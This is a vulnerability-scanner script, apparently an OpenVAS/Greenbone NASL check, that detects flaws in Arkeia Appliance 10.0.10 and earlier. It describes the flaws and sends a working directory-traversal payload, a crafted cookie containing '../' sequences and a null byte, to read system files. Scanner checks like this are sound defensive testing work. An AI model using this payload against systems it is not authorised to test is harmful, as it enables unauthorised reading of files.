CPE = "cpe:/a:knox_software:arkeia_appliance";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803760" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-09-18 15:16:06 +0530 (Wed, 18 Sep 2013)" );
	script_name( "Arkeia Appliance Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "This host is running Arkeia Appliance and is prone to multiple
  vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send the crafted HTTP GET request and check is it possible to read
  the system file or not." );
	script_tag( name: "solution", value: "Upgrade to Arkeia Appliance 10.1.10 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "insight", value: "Multiple flaws are due,

  - There are no restrictions when a POST request is send to
  '/scripts/upload.php' thus allowing any unauthenticated client to upload
  any data to the /tmp/ApplianceUpdate file.

  - Input passed via 'lang' parameter to 'Cookie' field in HTTP header is not
  properly sanitised before being returned to the user." );
	script_tag( name: "affected", value: "Arkeia Appliance Version 10.0.10 and prior." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to perform directory
  traversal attacks and read arbitrary files on the affected application." );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/28330" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/123275" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_arkeia_virtual_appliance_detect.sc" );
	script_mandatory_keys( "ArkeiaAppliance/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://www.arkeia.com/download" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = get_app_port( cpe: CPE, service: "www" );
if(!port){
	exit( 0 );
}
host = http_host_name( port: port );
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	attack = "lang=../../../../../../../../../../../../../../../../" + file + "%00";
	req = NASLString( "GET / HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: ", attack, "\\r\\n\\r\\n" );
	res = http_send_recv( port: port, data: req, bodyonly: FALSE );
	if(res && egrep( string: res, pattern: pattern )){
		report = "The target was found to be vulnerable";
		security_message( data: report, port: port );
		exit( 0 );
	}
}
exit( 99 );

